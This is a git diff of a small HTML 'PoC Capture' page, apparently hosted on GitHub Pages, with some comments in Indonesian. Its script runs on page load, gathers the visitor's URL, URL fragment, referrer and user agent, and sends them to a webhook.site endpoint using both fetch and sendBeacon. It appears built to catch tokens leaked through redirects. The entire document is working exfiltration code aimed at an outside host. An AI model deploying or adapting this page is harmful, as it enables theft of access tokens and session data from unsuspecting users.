@@ -1,33 +1,30 @@
 <!doctype html>
 <html>
-<head>
-  <meta charset="utf-8">
-  <title>Capture Page</title>
-</head>
+<head><meta charset="utf-8"><title>PoC Capture</title></head>
 <body>
-  <h3>Capturing...</h3>
+  <h3>PoC capture running</h3>
   <pre id="out"></pre>
 <script>
-  (function(){
-    const out = document.getElementById('out');
-    const payload = {
-      href: location.href,
-      hash: location.hash || "",
-      referrer: document.referrer || "",
-      ua: navigator.userAgent
-    };
-    out.textContent = JSON.stringify(payload, null, 2);
+(function(){
+  const out = document.getElementById('out');
+  const payload = {
+    href: location.href,
+    hash: location.hash || "",
+    referrer: document.referrer || "",
+    ua: navigator.userAgent
+  };
+  out.textContent = JSON.stringify(payload, null, 2);
 
-    // Send to webhook.site (replace with your URL)
-    const webhook = "https://webhook.site/d1233caa-6311-47e6-886e-293c7de27c5d";
-    // Using fetch GET to make it simpler (webhook.site accepts)
-    fetch(webhook + "?from=github_pages&hash=" + encodeURIComponent(payload.hash) + "&ref=" + encodeURIComponent(payload.referrer) + "&url=" + encodeURIComponent(payload.href))
-      .catch(()=>{});
-    // Also try sendBeacon (best-effort)
-    try {
-      navigator.sendBeacon && navigator.sendBeacon(webhook, JSON.stringify(payload));
-    } catch(e){}
-  })();
+  // kirim ke webhook.site (ganti ID)
+  const webhook = "https://webhook.site/d1233caa-6311-47e6-886e-293c7de27c5d";
+  // kirim via GET supaya mudah lihat di logs
+  fetch(webhook + "?from=ghpages&ref=" + encodeURIComponent(payload.referrer) +
+        "&hash=" + encodeURIComponent(payload.hash) +
+        "&u=" + encodeURIComponent(payload.href) +
+        "&ua=" + encodeURIComponent(payload.ua)).catch(()=>{});
+  // juga coba sendBeacon
+  try { navigator.sendBeacon && navigator.sendBeacon(webhook, JSON.stringify(payload)); } catch(e){}
+})();
 </script>
 </body>
 </html>
